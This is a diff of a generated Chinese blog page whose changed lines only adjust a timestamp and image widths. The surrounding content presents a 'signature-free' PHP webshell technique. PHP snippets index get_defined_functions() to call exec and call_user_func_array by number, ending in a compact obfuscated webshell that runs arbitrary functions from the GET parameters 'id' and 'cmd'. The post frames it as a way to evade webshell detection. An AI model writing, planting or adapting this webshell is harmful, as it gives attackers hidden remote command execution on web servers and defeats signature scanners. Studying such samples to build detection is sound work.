@@ -88,7 +88,7 @@
 <meta property="og:locale" content="Zh/Cn">
 <meta property="og:image" content="https://i.loli.net/2018/07/26/5b5970cd2807b.png">
 <meta property="og:image" content="https://i.loli.net/2018/07/26/5b5976fc20ea7.png">
-<meta property="og:updated_time" content="2018-07-26T07:24:16.260Z">
+<meta property="og:updated_time" content="2018-07-26T08:00:52.248Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php无特征webshell（get_defined_functions函数）">
 <meta name="twitter:description" content="该函数的php.net介绍1http://php.net/manual/zh/function.get-defined-functions.php 具体可以到里面看，其实就是返回了所有定义的函数，包括自定义及内置的函数，那么我们就可以通过该函数进行调用比如一些exec，system等函数，从而达到无特征webshell。其实这里还是有点小问题，就是说，可能返回的函数名数组的位置可能不是固定的，可能">
@@ -317,9 +317,9 @@
 <p>具体可以到里面看，其实就是返回了所有定义的函数，包括自定义及内置的函数，那么我们就可以通过该函数进行调用比如一些exec，system等函数，从而达到无特征webshell。<br>其实这里还是有点小问题，就是说，可能返回的函数名数组的位置可能不是固定的，可能需要我们测试目标上的是否和本地的位置为一致的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function callfunc()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $func = get_defined_functions();  //函数自己完成所有函数的枚举，成为list</span><br><span class="line">    $args = func_get_args();  //获取传入参数值</span><br><span class="line">    $func_id = array_shift($args);  //获取传入的函数所代表的list key</span><br><span class="line">    $func_name = $func[&apos;internal&apos;][$func_id];  //以key来索引函数名</span><br><span class="line"></span><br><span class="line">    return call_user_func_array($func_name, $args);  //调用回调函数，传参执行</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print callfunc(1076, &quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>我的exec位置在1076，大家可以自己echo一下get_defined_functions()，看看自己的exec在什么位置。</p>
 <p>demo如上，那么我们就可以按照使用get_defined_functions()的思路来把所有的函数名称替换一下。<br>其中，我的各个函数的位置如图：</p>
-<p><img src="https://i.loli.net/2018/07/26/5b5970cd2807b.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/07/26/5b5970cd2807b.png" width="50%"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function f()</span><br><span class="line">&#123;</span><br><span class="line">    $a = get_defined_functions()[&apos;internal&apos;];</span><br><span class="line">    $s = $a[3](); //func_get_args();</span><br><span class="line">    $b = $a[1427]($s); //array_shift($s);</span><br><span class="line">    $c = $a[$b]; //$func[&apos;internal&apos;][$b];</span><br><span class="line">    return $a[1178]($c, $s);//return call_user_func_array($func_name, $args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print f($_GET[&apos;id&apos;], $_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2018/07/26/5b5976fc20ea7.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/07/26/5b5976fc20ea7.png" width="70%"></p>
 
       
     </div>
